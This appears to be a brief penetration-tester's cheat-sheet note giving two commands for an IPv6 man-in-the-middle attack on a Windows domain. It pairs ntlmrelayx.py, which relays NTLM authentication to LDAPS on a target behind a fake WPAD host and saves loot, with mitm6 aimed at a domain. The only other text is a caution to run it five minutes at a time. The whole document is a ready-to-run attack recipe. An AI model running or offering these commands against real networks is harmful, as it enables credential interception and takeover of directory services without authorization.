

In tab
`ntlmrelayx.py -6 -t ldaps://<IP> -wh fakewpad.<Domain>.<TLD> -l lootme`

In another tab
`sudo mitm6 -d <domain>`

Note: only run this for 5 minutes at a time